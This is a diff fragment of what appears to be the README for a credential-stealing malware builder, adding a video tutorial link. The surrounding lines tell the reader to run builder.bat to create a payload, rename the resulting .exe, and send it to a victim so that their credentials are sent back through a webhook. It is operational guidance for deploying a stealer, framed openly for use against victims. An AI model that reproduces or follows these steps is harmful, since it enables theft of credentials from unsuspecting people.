@@ -10,7 +10,8 @@ save the file and run the builder.bat file to create the payload
 once the process is done go into the dist folder where you will find asdasdasd.exe (sometimes hovering over this will freeze file explorer for a bit this is normal)
 you can rename it to whatever you like and send to the victim where they will run it and their credentials will be send to you via the webhook you made earlier
 
-video tutorial:
+video tutorial: https://www.youtube.com/watch?v=S-GUNBo-Zx0
+
 
 # Distrubution Rules
 
